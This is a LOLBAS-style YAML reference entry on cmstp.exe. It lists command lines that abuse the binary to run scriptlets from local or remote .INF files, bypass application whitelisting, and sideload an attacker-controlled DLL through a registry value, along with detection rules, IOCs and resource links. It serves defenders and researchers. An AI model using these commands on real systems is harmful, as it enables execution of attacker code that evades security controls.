      document_utf8: "---\nName: Cmstp.exe\nDescription: Installs or removes a Connection Manager service\
        \ profile.\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: cmstp.exe /ni /s\
        \ {PATH_ABSOLUTE:.inf}\n    Description: Silently installs a specially formatted local .INF without\
        \ creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes\
        \ a .SCT file using scrobj.dll.\n    Usecase: Execute code hidden within an inf file. Download\
        \ and run scriptlets from internet.\n    Category: Execute\n    Privileges: User\n    MitreID:\
        \ T1218.003\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10,\
        \ Windows 11\n    Tags:\n      - Execute: INF\n  - Command: cmstp.exe /ni /s {REMOTEURL:.inf}\n\
        \    Description: Silently installs a specially formatted remote .INF without creating a desktop\
        \ icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using\
        \ scrobj.dll.\n    Usecase: Execute code hidden within an inf file. Execute code directly from\
        \ Internet.\n    Category: AWL Bypass\n    Privileges: User\n    MitreID: T1218.003\n    OperatingSystem:\
        \ Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10\n    Tags:\n      - Execute: INF\n\
        \      - Execute: Remote\n  - Command: cmstp.exe /nf\n    Description: cmstp.exe reads the `HKLM\\\
        SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe\\CmstpExtensionDll` registry\
        \ value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting\
        \ it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`.\n    Usecase: Proxy\
        \ execution of a malicious DLL via registry modification.\n    Category: Execute\n    Privileges:\
        \ Administrator\n    MitreID: T1218.003\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n\
        \      - Execute: DLL\n      - Requires: Registry Change\nFull_Path:\n  - Path: C:\\Windows\\\
        System32\\cmstp.exe\n  - Path: C:\\Windows\\SysWOW64\\cmstp.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml\n\
        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml\n\
        \  - Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml\n\
        \  - Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml\n\
        \  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml\n\
        \  - IOC: Execution of cmstp.exe without a VPN use case is suspicious\n  - IOC: DotNet CLR libraries\
        \ loaded into cmstp.exe\n  - IOC: DotNet CLR Usage Log - cmstp.exe.log\n  - IOC: Registry modification\
        \ to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe\\CmstpExtensionDll\n\
        Resources:\n  - Link: https://twitter.com/NickTyrer/status/958450014111633408\n  - Link: https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80\n\
        \  - Link: https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e\n  - Link: https://oddvar.moe/2017/08/15/research-on-cmstp-exe/\n\
        \  - Link: https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1\n\
        \  - Link: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp\n\
        \  - Link: https://gist.github.com/ghosts621/ea8ad5b8a0904dd40b33f01f0e8285dc\nAcknowledgement:\n\
        \  - Person: Oddvar Moe\n    Handle: '@oddvarmoe'\n  - Person: Nick Tyrer\n    Handle: '@NickTyrer'\n\
        \  - Person: Naor Evgi\n    Handle: '@ghosts621'\n"
